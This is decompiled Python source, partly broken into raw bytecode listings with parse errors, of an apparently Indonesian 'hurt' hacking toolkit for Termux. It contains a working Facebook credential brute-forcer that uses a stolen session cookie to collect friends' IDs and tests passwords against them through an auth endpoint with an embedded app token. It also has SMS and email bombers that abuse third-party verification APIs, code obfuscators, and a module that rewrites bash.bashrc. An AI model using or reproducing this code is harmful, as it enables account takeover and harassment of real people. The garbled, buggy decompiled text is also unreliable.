 L. 781         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                get
                4  LOAD_FAST                'friend'
                6  LOAD_GLOBAL              self
                8  LOAD_ATTR                Cookie
               10  LOAD_CONST               ('cookies',)
               12  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               14  LOAD_ATTR                content
               16  STORE_FAST               'II'

 L. 782        18  LOAD_GLOBAL              re
               20  LOAD_METHOD              findall
               22  LOAD_STR                 'middle"><a class=".." href="(.*?)">(.*?)</a>'
               24  LOAD_GLOBAL              str
               26  LOAD_FAST                'II'
               28  CALL_FUNCTION_1       1  ''
               30  CALL_METHOD_2         2  ''
               32  STORE_FAST               'getid'

 L. 783        34  LOAD_FAST                'getid'
               36  GET_ITER         
             38_0  COME_FROM           180  '180'
             38_1  COME_FROM           106  '106'
               38  FOR_ITER            182  'to 182'
               40  STORE_FAST               'L'

 L. 784        42  LOAD_STR                 'profile'
               44  LOAD_FAST                'L'
               46  LOAD_CONST               0
               48  BINARY_SUBSCR    
               50  COMPARE_OP               in
               52  POP_JUMP_IF_FALSE    98  'to 98'

 L. 785        54  LOAD_GLOBAL              id
               56  LOAD_METHOD              append
               58  LOAD_FAST                'L'
               60  LOAD_CONST               1
               62  BINARY_SUBSCR    
               64  LOAD_STR                 '|'
               66  BINARY_ADD       
               68  LOAD_GLOBAL              re
               70  LOAD_METHOD              findall
               72  LOAD_STR                 '=(\\d*)?'
               74  LOAD_GLOBAL              str
               76  LOAD_FAST                'L'
               78  LOAD_CONST               0
               80  BINARY_SUBSCR    
               82  CALL_FUNCTION_1       1  ''
               84  CALL_METHOD_2         2  ''
               86  LOAD_CONST               0
               88  BINARY_SUBSCR    
               90  BINARY_ADD       
               92  CALL_METHOD_1         1  ''
               94  POP_TOP          
               96  JUMP_FORWARD        156  'to 156'
             98_0  COME_FROM            52  '52'

 L. 786        98  LOAD_STR                 'friends'
              100  LOAD_FAST                'L'
              102  COMPARE_OP               in
              104  POP_JUMP_IF_FALSE   110  'to 110'

 L. 787       106  JUMP_BACK            38  'to 38'
              108  BREAK_LOOP          156  'to 156'
            110_0  COME_FROM           104  '104'

 L. 789       110  LOAD_GLOBAL              id
              112  LOAD_METHOD              append
              114  LOAD_FAST                'L'
              116  LOAD_CONST               1
              118  BINARY_SUBSCR    
              120  LOAD_STR                 '|'
              122  BINARY_ADD       
              124  LOAD_FAST                'L'
              126  LOAD_CONST               0
              128  BINARY_SUBSCR    
              130  LOAD_METHOD              split
              132  LOAD_STR                 '/'
              134  CALL_METHOD_1         1  ''
              136  LOAD_CONST               1
              138  BINARY_SUBSCR    
              140  LOAD_METHOD              split
              142  LOAD_STR                 '?'
              144  CALL_METHOD_1         1  ''
              146  LOAD_CONST               0
              148  BINARY_SUBSCR    
              150  BINARY_ADD       
              152  CALL_METHOD_1         1  ''
              154  POP_TOP          
            156_0  COME_FROM           108  '108'
            156_1  COME_FROM            96  '96'

 L. 791       156  LOAD_GLOBAL              print
              158  LOAD_STR                 '\r• Total ID --> '
              160  LOAD_GLOBAL              str
              162  LOAD_GLOBAL              len
              164  LOAD_GLOBAL              id
              166  CALL_FUNCTION_1       1  ''
              168  CALL_FUNCTION_1       1  ''
              170  BINARY_ADD       
              172  LOAD_STR                 ''
              174  LOAD_CONST               ('end',)
              176  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              178  POP_TOP          
              180  JUMP_BACK            38  'to 38'
            182_0  COME_FROM            38  '38'

 L. 792       182  LOAD_STR                 'Lihat Teman Lain'
              184  LOAD_GLOBAL              str
              186  LOAD_FAST                'II'
              188  CALL_FUNCTION_1       1  ''
              190  COMPARE_OP               in
              192  POP_JUMP_IF_FALSE   228  'to 228'

 L. 793       194  LOAD_FAST                'getid'
              196  LOAD_STR                 'https://mbasic.facebook.com{}'
              198  LOAD_METHOD              format
              200  LOAD_GLOBAL              cantik
              202  LOAD_FAST                'II'
              204  LOAD_STR                 'html.parser'
              206  CALL_FUNCTION_2       2  ''
              208  LOAD_ATTR                find
              210  LOAD_STR                 'a'
              212  LOAD_STR                 'Lihat Teman Lain'
              214  LOAD_CONST               ('string',)
              216  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              218  LOAD_STR                 'href'
              220  BINARY_SUBSCR    
              222  CALL_METHOD_1         1  ''
              224  CALL_FUNCTION_1       1  ''
              226  POP_TOP          
            228_0  COME_FROM           192  '192'

 L. 794       228  LOAD_GLOBAL              id
              230  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `LOAD_STR' instruction at offset 182
"""


        def login(username, password, cek=Cookie):
            global die
            global rcheck
            global result
            API = '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
            DATA = {'access_token':API, 
             'format':'JSON', 
             'sdk_version':'2', 
             'email':username, 
             'password':password, 
             'sdk':'ios', 
             'generate_session_cookies':'1', 
             'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
            APIS = 'https://b-api.facebook.com/method/auth.login'
            res = requests.get(APIS, params=DATA)
            if 'EAA' in res.text:
                print(f"\rLife ---> {username} | {password}", end='')
                result += 1
                if cek:
                    life.append(username + ' | ' + password)
                else:
                    with open('Result/Life', 'a') as Lif:
                        Lif.write(username + ' | ' + password + '\n')
            elif 'www.facebook.com' in res.json()['error_msg']:
                print(f"\rCheck ---> {username} | {password}", end='')
                rcheck += 1
                if cek:
                    check.append(username + ' | ' + password)
                else:
                    with open('Result/Check', 'a') as Cek:
                        Cek.write(username + ' | ' + password + '\n')
            else:
                die += 1
            for l in list('....'):
                print(f"\r[{l}] Life ---> [{str(result)}] Check ---> [{str(rcheck)}] Die ---> [{str(die)}]", end='')
                sleep(0.1)


        class Hack_ListFriend:

            def __init__(self):
                self.Start()

            def Start(self):
                try:
                    self.Cooki = open('Token/cookie').read()
                    Cookie = {'cookie': self.Cooki}
                except IOError:
                    print('Error 404')
                else:
                    friend = cantik(requests.get(('https://masic.facebook.com{}'.format('/me')), cookies=Cookie).content, 'html.parser').find('a', string='Teman')
                    username = getusr('https://mbasic.facebook.com{}'.format(friend['href']))
                    print('----------------------------------------------------------')
                    with ThreadPoolExecutor(max_workers=30) as ex:
                        for usern in username:
                            user = usern.split('|')
                            Le = user[0].split(' ')
                            for Leon in Le:
                                listpassw = [
                                 str(Leon) + '123', str(Leon) + '12345', str(Leon) + '123456', str(Leon) + '123321', str(Leon) + '12', str(Leon) + '1234567890', str(Leon) + '54321', str(Leon) + '0987654321', 'sayang', 'cintaku', 'sayang123', 'sayang12345', 'sayang123321', 'sayang321', 'sayangku', 'sayang123456', 'sayangku123', 'sayangku12', 'sayangku321', 'kontol', 'kontol12', 'kontol123', 'kontol1234', 'kontol12345', 'kontol321', 'kontol123456', 'bangsat', 'bangsat123', 'bangsat1234', 'bangsat12345', 'bangsat123455', 'fucek', 'indonesia', 'bandung', 'amerika', 'fucek123', '@@@@@@@@', '0987654321asd', 'asd1234567890', '1234567890asd', 'asd0987654321', 'memek123', 'memek1234', 'memek12345', 'freefire', 'pubg12345', 'freefire123', 'cintacinta', 'doraemon', 'loli12345', 'sagiri', 'sagiri123', 'naruto123', 'naruto12345', 'mobilelegend', 'mobillejen', 'mobilelegend123', 'aov12345', 'makasar123', 'asu12345', 'kamvret123', 'bujang123', 'kenthu123', 'kenthu12345', 'k&212345', 'nguwe123', 'ngentod', 'ngentod123', 'meme12345', 'jungkook', 'jungkook123', 'lalisa123', 'lalisa', 'manoban123', 'jimin123', 'jinxpro123', 'asdfghjkl', 'qwerty123', 'qwerty12345']
                                for passwordn in set(listpassw):
                                    ex.submit(login, user[1], passwordn)

                if rcheck != 0 or result != 0:
                    print("\nDone, Check in Dictionary 'Result'")
                else:
                    print(' No Result')


        class Spammer:

            def __init__(self):
                self.spam()

            def spam(self):
                print('\nphone sms boomber\t\tSpam SMS number phone\ngmail boomber\t\t\tSpam Gmail Account\n\t\t')
                while True:
                    try:
                        self.scommand = input(' hurt(spammer) > ')
                        if self.scommand in ('phone sms boomber', ):
                            Phone()
                        elif self.scommand in ('gmail boomber', ):
                            Gmail.spam()
                        else:
                            print('Hurt err : not found')
                    except (KeyboardInterrupt, EOFError):
                        Exit()


        class Phone:

            def __init__(self):
                self.num()

            def num(self):
                print('\n')
                self = input(' Number Phone : (Ex : 0813xx) > ')
                self = int(input(' Jumlah : '))
                h = sehat()
                for a in range(jum):
                    h.sehat(num)

            def sehat(self, num):
                head = {'accept':'application/json, text/javascript, */*; q=0.01', 
                 'origin':'https://www.prosehat.com', 
                 'x-requested-with':'XMLHttpRequest', 
                 'user-agent':'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36', 
                 'content-type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'referer':'https://www.prosehat.com/akun'}
                ata = {'phone_or_email':num, 
                 'action':'ajaxverificationsend'}
                req = requests.post('https://www.prosehat.com/wp-admin/admin-ajax.php', data=ata, headers=head)
                if 'token' in req.text:
                    print(' Success ✓')
                    for x in range(60):
                        print(end=f"\r>> Sleep {60 - (x + 1)}s << ", flush=True)
                        time.sleep(1)
                    else:
                        print()

                else:
                    print(f" Fail {req.text}")
                    for x in range(60):
                        print(end=f"\r>> Sleep {60 - (x + 1)}s << ", flush=True)
                        time.sleep(1)
                    else:
                        print()


        c = int(0)
        scc = int(0)
        fail = int(0)

        class Gmail:

            def spam():
                try:
                    em = input(' Target Email : ')
                    jum = input(' Jumlah : ')
                    while True:
                        if c < int(jum):
                            s = '200'
                            d = {'email':em,  'device_id':'6bb443543d62ab32'}
                            u = {'User-Agent': 'surveyon/2.0.3 (Android: 6.0.1; MODEL:ASUS_X00AD; PRODUCT:WW_Phone; MANUFACTURER:asus;)'}
                            r = requests.post('https://www.surveyon.com/surveyon_api/mobile/v1_1/signup/confirmation_key', data=(json.dumps(d)), headers=u)
                            if str(s) in str(r.text):
                                scc += 1
                                print(' Success ')
                            else:
                                fail += 1
                                print(' Failed ')
                            sys.stdout.flush()
                            sleep(1)
                            c += 1

                except:
                    print('Error 404')


        class Hash:

            def __init__(self):
                self.hash()

            def hash(self):
                print('\nencript\t\t\t\tEncript hash\ndecript\t\t\t\tDecript Hash\n\t\t')
                while True:
                    try:
                        self.hcommand = input(' hurt(hash) > ')
                        if self.hcommand in ('encript', 'Encript'):
                            Hash_Encript()
                        elif self.hcommand in ('decript', 'Decript'):
                            Hash_Decript()
                    except (KeyboardInterrupt, EOFError):
                        Exit()


        class Python_Obfuscate:

            def __init__(self):
                self.obf()

            def obf(self):
                print('\npython3\npython2\n\t\t')
                while True:
                    try:
                        self.obcommand = input(' hurt(pythonobf) > ')
                        if self.obcommand in ('python3', ):
                            self.Py3()
                        elif self.obcommand in ('python2', ):
                            self.Py2()
                        elif self.obcommand in ('--help', 'help', 'menu'):
                            self.obf()
                        else:
                            print(' Hurt err : not found')
                    except (KeyboardInterrupt, EOFError):
                        Exit()

            def Py3(self):
                try:
                    os.mkdir('Python-Obfuscate')
                except:
                    pass

                try:
                    self.File = input('\n File : ')
                    self.Op = open(self.File).read()
                    sleep(1)
                    os.system("python Data/___main__.py %s ' '" % self.File)
                    print(' Result : Obfuscate/Result_py3.py')
                    print('')
                except IOError:
                    print(' File not found')

            def Py2(self):
                try:
                    os.mkdir('Python-Obfuscate')
                except:
                    pass

                try:
                    self.File = input('\n File : ')
                    self.Op = open(self.File).read()
                    sleep(1)
                    os.system("python Data/__parser__.py %s ' '" % self.File)
                    print(' Result : Obfuscate/Result_py2.py')
                    print('')
                except IOError:
                    print(' File not Found')


        class Python_DeObfuscate:

            def __init__(self):
                self.deob()

            def deob(self):
                print('\npython3\npython2\n\t\t')
                while True:
                    try:
                        self.dobcommand = input(' hurt(pythondeobf) > ')
                        if self.dobcommand in ('python3', ):
                            self.Pyy3()
                        elif self.dobcommand in ('python2', ):
                            self.Pyy2()
                        elif self.dobcommand in ('--help', 'help', 'menu'):
                            self.deob()
                        else:
                            print(' hurt error : not Found')
                    except (KeyboardInterrupt, EOFError):
                        Exit()
#<<--Function Pyy3 Error-->>
            def Pyy3(self):
                print('\npyc\t\t\tDeobfuscate pyc to py\nother\n\t\t')
                while True:
                    try:
                        self.py3command = input(' hurt(pythondeob/py3) > ')
                        if self.py3command in ('pyc', ):
                            try:
                                os.mkdir('Python-Deobfuscate')
                            except:
                                pass
                            else:
                                try:
                                    self.File = input('\n File : ')
                                    self.op = open(self.File).read()
                                    os.system('uncompyle6 %s >> Python-Deobfuscate/Result_pyc.py')
                                    print(' Result : Python-Deobfuscate/Result_pyc.py')
                                except IOError:
                                    print(' File not Found')

                        elif self.py3command in ('other', ):
                            print(' You can Deobfuscate with Online or Manual Decompile')
                        else:
                            print(' Hurt err : not Found')
                    except (KeyboardInterrupt, EOFError):
                        Exit()
"""
            def Pyy3--- This code section failed: ---

 L.1049         0  LOAD_GLOBAL              print
                2  LOAD_STR                 '\npyc\t\t\tDeobfuscate pyc to py\nother\n\t\t'
                4  CALL_FUNCTION_1       1  ''
                6  POP_TOP          
              8_0  COME_FROM           200  '200'
              8_1  COME_FROM           196  '196'
              8_2  COME_FROM           168  '168'

 L.1054         8  SETUP_FINALLY       170  'to 170'

 L.1055        10  LOAD_GLOBAL              input
               12  LOAD_STR                 ' hurt(pythondeob/py3) > '
               14  CALL_FUNCTION_1       1  ''
               16  LOAD_FAST                'self'
               18  STORE_ATTR               py3command

 L.1056        20  LOAD_FAST                'self'
               22  LOAD_ATTR                py3command
               24  LOAD_CONST               ('pyc',)
               26  COMPARE_OP               in
               28  POP_JUMP_IF_FALSE   138  'to 138'

 L.1057        30  SETUP_FINALLY        46  'to 46'

 L.1058        32  LOAD_GLOBAL              os
               34  LOAD_METHOD              mkdir
               36  LOAD_STR                 'Python-Deobfuscate'
               38  CALL_METHOD_1         1  ''
               40  POP_TOP          
               42  POP_BLOCK        
               44  JUMP_FORWARD         58  'to 58'
             46_0  COME_FROM_FINALLY    30  '30'

 L.1059        46  POP_TOP          
               48  POP_TOP          
               50  POP_TOP          

 L.1060        52  POP_EXCEPT       
               54  BREAK_LOOP           58  'to 58'
               56  END_FINALLY      
             58_0  COME_FROM            54  '54'
             58_1  COME_FROM            44  '44'

 L.1061        58  SETUP_FINALLY       108  'to 108'

 L.1062        60  LOAD_GLOBAL              input
               62  LOAD_STR                 '\n File : '
               64  CALL_FUNCTION_1       1  ''
               66  LOAD_FAST                'self'
               68  STORE_ATTR               File

 L.1063        70  LOAD_GLOBAL              open
               72  LOAD_FAST                'self'
               74  LOAD_ATTR                File
               76  CALL_FUNCTION_1       1  ''
               78  LOAD_METHOD              read
               80  CALL_METHOD_0         0  ''
               82  LOAD_FAST                'self'
               84  STORE_ATTR               op

 L.1064        86  LOAD_GLOBAL              os
               88  LOAD_METHOD              system
               90  LOAD_STR                 'uncompyle6 %s >> Python-Deobfuscate/Result_pyc.py'
               92  CALL_METHOD_1         1  ''
               94  POP_TOP          

 L.1065        96  LOAD_GLOBAL              print
               98  LOAD_STR                 ' Result : Python-Deobfuscate/Result_pyc.py'
              100  CALL_FUNCTION_1       1  ''
              102  POP_TOP          
              104  POP_BLOCK        
              106  JUMP_FORWARD        166  'to 166'
            108_0  COME_FROM_FINALLY    58  '58'

 L.1066       108  DUP_TOP          
              110  LOAD_GLOBAL              IOError
              112  COMPARE_OP               exception-match
              114  POP_JUMP_IF_FALSE   134  'to 134'
              116  POP_TOP          
              118  POP_TOP          
              120  POP_TOP          

 L.1067       122  LOAD_GLOBAL              print
              124  LOAD_STR                 ' File not Found'
              126  CALL_FUNCTION_1       1  ''
              128  POP_TOP          
              130  POP_EXCEPT       
              132  JUMP_FORWARD        166  'to 166'
            134_0  COME_FROM           114  '114'
              134  END_FINALLY      
              136  JUMP_FORWARD        166  'to 166'
            138_0  COME_FROM            28  '28'

 L.1068       138  LOAD_FAST                'self'
              140  LOAD_ATTR                py3command
              142  LOAD_CONST               ('other',)
              144  COMPARE_OP               in
              146  POP_JUMP_IF_FALSE   158  'to 158'

 L.1069       148  LOAD_GLOBAL              print
              150  LOAD_STR                 ' You can Deobfuscate with Online or Manual Decompile'
              152  CALL_FUNCTION_1       1  ''
              154  POP_TOP          
              156  JUMP_FORWARD        166  'to 166'
            158_0  COME_FROM           146  '146'

 L.1071       158  LOAD_GLOBAL              print
              160  LOAD_STR                 ' Hurt err : not Found'
              162  CALL_FUNCTION_1       1  ''
              164  POP_TOP          
            166_0  COME_FROM           156  '156'
            166_1  COME_FROM           136  '136'
            166_2  COME_FROM           132  '132'
            166_3  COME_FROM           106  '106'
              166  POP_BLOCK        
              168  JUMP_BACK             8  'to 8'
            170_0  COME_FROM_FINALLY     8  '8'

 L.1072       170  DUP_TOP          
              172  LOAD_GLOBAL              KeyboardInterrupt
              174  LOAD_GLOBAL              EOFError
              176  BUILD_TUPLE_2         2 
              178  COMPARE_OP               exception-match
              180  POP_JUMP_IF_FALSE   198  'to 198'
              182  POP_TOP          
              184  POP_TOP          
              186  POP_TOP          

 L.1073       188  LOAD_GLOBAL              Exit
              190  CALL_FUNCTION_0       0  ''
              192  POP_TOP          
              194  POP_EXCEPT       
              196  JUMP_BACK             8  'to 8'
            198_0  COME_FROM           180  '180'
              198  END_FINALLY      
              200  JUMP_BACK             8  'to 8'

Parse error at or near `END_FINALLY' instruction at offset 56
"""
#<<--Function Pyy2 Error-->>
            def Pyy2(self):
                print('\npyc\t\t\tDeobfuscate pyc to py\nother\n\t\t')
                while True:
                    try:
                        self.py2command = input(' hurt(pythondeob/py2) > ')
                        if self.py3command in ('pyc', ):
                            try:
                                os.mkdir('Python-Deobfuscate')
                            except:
                                pass
                            else:
                                try:
                                    self.File = input('\n File : ')
                                    self.op = open(self.File).read()
                                    os.system('uncompyle6 %s >> Python-Deobfuscate/Result_pyc.py')
                                    print(' Result : Python-Deobfuscate/Result_pyc.py')
                                except IOError:
                                    print(' File not Found')

                        elif self.py2command in ('other', ):
                            print(' You can Deobfuscate with Online or Manual Decompile')
                        else:
                            print(' Hurt err : not Found')
                    except (KeyboardInterrupt, EOFError):
                        Exit()
"""
            def Pyy2--- This code section failed: ---

 L.1076         0  LOAD_GLOBAL              print
                2  LOAD_STR                 '\npyc\t\t\tDeobfuscate pyc to py\nother\n\t\t'
                4  CALL_FUNCTION_1       1  ''
                6  POP_TOP          
              8_0  COME_FROM           200  '200'
              8_1  COME_FROM           196  '196'
              8_2  COME_FROM           168  '168'

 L.1081         8  SETUP_FINALLY       170  'to 170'

 L.1082        10  LOAD_GLOBAL              input
               12  LOAD_STR                 ' hurt(pythondeob/py2) > '
               14  CALL_FUNCTION_1       1  ''
               16  LOAD_FAST                'self'
               18  STORE_ATTR               py2command

 L.1083        20  LOAD_FAST                'self'
               22  LOAD_ATTR                py3command
               24  LOAD_CONST               ('pyc',)
               26  COMPARE_OP               in
               28  POP_JUMP_IF_FALSE   138  'to 138'

 L.1084        30  SETUP_FINALLY        46  'to 46'

 L.1085        32  LOAD_GLOBAL              os
               34  LOAD_METHOD              mkdir
               36  LOAD_STR                 'Python-Deobfuscate'
               38  CALL_METHOD_1         1  ''
               40  POP_TOP          
               42  POP_BLOCK        
               44  JUMP_FORWARD         58  'to 58'
             46_0  COME_FROM_FINALLY    30  '30'

 L.1086        46  POP_TOP          
               48  POP_TOP          
               50  POP_TOP          

 L.1087        52  POP_EXCEPT       
               54  BREAK_LOOP           58  'to 58'
               56  END_FINALLY      
             58_0  COME_FROM            54  '54'
             58_1  COME_FROM            44  '44'

 L.1088        58  SETUP_FINALLY       108  'to 108'

 L.1089        60  LOAD_GLOBAL              input
               62  LOAD_STR                 '\n File : '
               64  CALL_FUNCTION_1       1  ''
               66  LOAD_FAST                'self'
               68  STORE_ATTR               File

 L.1090        70  LOAD_GLOBAL              open
               72  LOAD_FAST                'self'
               74  LOAD_ATTR                File
               76  CALL_FUNCTION_1       1  ''
               78  LOAD_METHOD              read
               80  CALL_METHOD_0         0  ''
               82  LOAD_FAST                'self'
               84  STORE_ATTR               op

 L.1091        86  LOAD_GLOBAL              os
               88  LOAD_METHOD              system
               90  LOAD_STR                 'uncompyle6 %s >> Python-Deobfuscate/Result_pyc.py'
               92  CALL_METHOD_1         1  ''
               94  POP_TOP          

 L.1092        96  LOAD_GLOBAL              print
               98  LOAD_STR                 ' Result : Python-Deobfuscate/Result_pyc.py'
              100  CALL_FUNCTION_1       1  ''
              102  POP_TOP          
              104  POP_BLOCK        
              106  JUMP_FORWARD        166  'to 166'
            108_0  COME_FROM_FINALLY    58  '58'

 L.1093       108  DUP_TOP          
              110  LOAD_GLOBAL              IOError
              112  COMPARE_OP               exception-match
              114  POP_JUMP_IF_FALSE   134  'to 134'
              116  POP_TOP          
              118  POP_TOP          
              120  POP_TOP          

 L.1094       122  LOAD_GLOBAL              print
              124  LOAD_STR                 ' File not Found'
              126  CALL_FUNCTION_1       1  ''
              128  POP_TOP          
              130  POP_EXCEPT       
              132  JUMP_FORWARD        166  'to 166'
            134_0  COME_FROM           114  '114'
              134  END_FINALLY      
              136  JUMP_FORWARD        166  'to 166'
            138_0  COME_FROM            28  '28'

 L.1095       138  LOAD_FAST                'self'
              140  LOAD_ATTR                py2command
              142  LOAD_CONST               ('other',)
              144  COMPARE_OP               in
              146  POP_JUMP_IF_FALSE   158  'to 158'

 L.1096       148  LOAD_GLOBAL              print
              150  LOAD_STR                 ' You can Deobfuscate with Online or Manual Decompile'
              152  CALL_FUNCTION_1       1  ''
              154  POP_TOP          
              156  JUMP_FORWARD        166  'to 166'
            158_0  COME_FROM           146  '146'

 L.1098       158  LOAD_GLOBAL              print
              160  LOAD_STR                 ' Hurt err : not Found'
              162  CALL_FUNCTION_1       1  ''
              164  POP_TOP          
            166_0  COME_FROM           156  '156'
            166_1  COME_FROM           136  '136'
            166_2  COME_FROM           132  '132'
            166_3  COME_FROM           106  '106'
              166  POP_BLOCK        
              168  JUMP_BACK             8  'to 8'
            170_0  COME_FROM_FINALLY     8  '8'

 L.1099       170  DUP_TOP          
              172  LOAD_GLOBAL              KeyboardInterrupt
              174  LOAD_GLOBAL              EOFError
              176  BUILD_TUPLE_2         2 
              178  COMPARE_OP               exception-match
              180  POP_JUMP_IF_FALSE   198  'to 198'
              182  POP_TOP          
              184  POP_TOP          
              186  POP_TOP          

 L.1100       188  LOAD_GLOBAL              Exit
              190  CALL_FUNCTION_0       0  ''
              192  POP_TOP          
              194  POP_EXCEPT       
              196  JUMP_BACK             8  'to 8'
            198_0  COME_FROM           180  '180'
              198  END_FINALLY      
              200  JUMP_BACK             8  'to 8'

Parse error at or near `END_FINALLY' instruction at offset 56
"""

        class Bash_Obfuscate:

            def __init__(self):
                self.bash()

            def bash(self):
                try:
                    os.mkdir('Bash-Obfuscate')
                except:
                    pass
                else:
                    try:
                        self.File = input(' File : ')
                        self.Op = open(self.File, 'r').read()
                    except IOError:
                        print(' File not Found')
                        self.bash()
                    else:
                        os.system('bash-obfuscate %s -o Bash-Obfuscate/Result.sh' % self.File)
                        sleep(1)
                        print(' Result : Bash-Obfuscate/Result.sh')


        class Bash_Deobfuscate:

            def __init__(self):
                self.de()

            def de(self):
                try:
                    os.mkdir('Bash-Deobfuscate')
                except:
                    pass

                try:
                    self.File = input(' File : ')
                    self.op = open(self.File).read()
                    self.Dec = self.op.replace('eval', 'echo')
                    self.Op = open('Result.sh', 'a')
                    self.Op.write(self.Dec)
                    self.Op.close()
                    os.system('touch Bash-Deobfuscate/Result.sh')
                    os.system('bash Result.sh > Bash-Deobfuscate/Result.sh')
                    os.remove('Result.sh')
                    print(' Result : Bash-Deobfuscate/Result.sh')
                except IOError:
                    print(' File not Found')
                    self.de()


        class Hurt_Assistant:

            def __init__(self):
                self.asst()

            def asst(self):
                print('\n Welcome, say open something')
                while True:
                    try:
                        self.me = input('command : ')
                        if self.me in ('--help', 'help'):
                            print('\nCommand:\n\topen facebook\n\topen google\n\topen instagram\n\topen whatsapp\n\topen tweeter\n\topen wikipedia\n\topen github\n\topen youtube\n\t\t\t\t\t')
                        elif self.me in ('open facebook', 'open fb'):
                            os.system('xdg-open https://m.facebook.com/')
                        elif self.me in ('open google', ):
                            os.system('xdg-open https://google.com')
                        elif self.me in ('open instagram', ):
                            os.system('xdg-open https://instagram.com')
                        elif self.me in ('open whatsapp', ):
                            os.system('xdg-open https://web.whatsapp.com')
                        elif self.me in ('open tweeter', ):
                            os.system('xdg-open https://tweeter.com')
                        elif self.me in ('open wikipedia', ):
                            os.system('xdg-open https://wikipedia.com')
                        elif self.me in ('open github', ):
                            os.system('xdg-open https://github.com/')
                        elif self.me in ('open youtube', ):
                            os.system('xdg-open https://m.youtube.com')
                        else:
                            print("computer : I don't know :(")
                    except (KeyboardInterrupt, EOFError):
                        Exit()


        class Lock:

            def __init__(self):
                print('\n• Enter the username and password\n\t\t')
                self.lock()

            def lock(self):
                try:
                    self.username = input(' Username : ')
                    if self.username == '':
                        print(' Username must be more than 6 characters')
                        self.lock()
                    else:
                        self.password = input(' Password : ')
                        if self.password == '':
                            print(' Password must be more than 6 characters')
                            self.lock()
                        else:
                            pass
                        self.Data = '\nimport os, time\n\nusername = \'%s\'\npassword = \'%s\'\n\ntry:\n\tos.system(\'clear\')\n\tprint(\'\'\'\n\n\n\n\'\'\')\n\tprint("[+] Login Admin User [+]")\n\tusr = input(\'[?] Username : \')\n\tpasw = input(\'[?] Password : \')\n\tif usr in username:\n\t\tpass\n\telse:\n\t\tprint("Username Correct")\n\t\ttime.sleep(2)\n\t\tos.system(\'clear\')\n\t\tos.system(\'bash\')\n\tif pasw in password:\n\t\tpass\n\telse:\n\t\tprint("Password Correct")\n\t\tos.system(\'clear\')\n\t\ttime.sleep(2)\n\t\tos.system(\'bash\')\n\t\n\tprint("[✓] Login Success")\n\ttime.sleep(2)\n\tos.system(\'clear\')\n\nexcept (KeyboardInterrupt, EOFError):\n\tos.system(\'bash\')\n\t\t\t\t' % (
                         self.username, self.password)
                        self.Wr = open('.admin.py', 'a')
                        self.Wr.write(self.Data)
                        self.Wr.close()
                        self.Theme = '\nif [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then\n        command_not_found_handle() {\n                /data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"\n        }\nfi\n\n\n\nPS1=\'\\w # \'\npython .admin.py\n\n\t\t\t\t'
                        self.Wrt = open('bash.bashrc', 'a')
                        self.Wrt.write(self.Theme)
                        self.Wrt.close()
                        os.system('sh server/__main__.sh')
                        print(' Finish')
                except KeyboardInterrupt:
                    Exit()


        if __name__ == '__main__':
            try:
                new = requests.get('https://raw.githubusercontent.com/serverhurttoolkit/update/master/update.txt').text
                if 'Not Update' in new:
                    pass
                elif 'Update' in new:
                    Check_Update()
                check = open('.remember').read()
                HasVery()
            except IOError:
                __Verify__()
            except KeyboardInterrupt:
                exit()
            except Exception as ER:
                try:
                    os.system('clear')
                    exit('\x1b[1;91m No Connection')
                finally:
                    ER = None
                    del ER

# global count ## Warning: Unused global
